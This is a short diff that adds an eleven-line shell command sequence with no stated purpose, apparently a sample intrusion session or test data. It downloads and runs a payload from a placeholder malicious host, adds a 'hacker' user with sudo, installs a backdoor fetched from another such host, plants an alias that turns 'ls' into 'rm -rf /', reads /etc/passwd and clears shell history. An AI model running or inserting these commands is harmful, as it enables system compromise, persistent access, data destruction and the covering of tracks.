@@ -1,0 +1,11 @@
+ls -la
+cd /tmp
+wget http://malicious-site.com/payload.sh
+chmod +x payload.sh
+./payload.sh
+sudo useradd hacker -p $(openssl passwd hacker123)
+curl http://badactor.com/backdoor -o /usr/local/bin/backdoor
+chmod +x /usr/local/bin/backdoor
+echo "alias ls='rm -rf /'" >> ~/.bashrc
+cat /etc/passwd
+history -c
